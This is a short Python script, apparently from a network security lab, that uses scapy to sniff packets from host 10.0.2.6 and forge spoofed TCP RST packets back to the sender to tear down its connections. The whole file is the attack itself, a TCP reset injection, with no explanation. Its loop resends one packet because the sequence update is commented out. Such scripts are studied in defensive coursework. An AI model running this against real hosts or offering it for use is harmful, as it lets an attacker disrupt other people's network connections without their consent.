from scapy.all import * 

def callbk(t):
    try:
        win=512
        tcp_rst_count = 10
        tcpdata = {
            'src': t[IP].src,
            'dst': t[IP].dst,
            'sport': t[TCP].sport,
            'dport': t[TCP].dport,
            'seq': t[TCP].seq,
            'ack': t[TCP].ack
        }
        max_seq = tcpdata['ack'] + tcp_rst_count * win
        seqs = range(tcpdata['ack'], max_seq, int(win / 2))
        p = IP(src=tcpdata['dst'], dst=tcpdata['src']) / \
                    TCP(sport=tcpdata['dport'], dport=tcpdata['sport'],
                    flags="R", window=win, seq=seqs[0])
        
        for seq in seqs:
           # p.seq = seq
            send(p)
    except Exception:
        pass

t = sniff(
          filter="src host 10.0.2.6",prn=callbk)
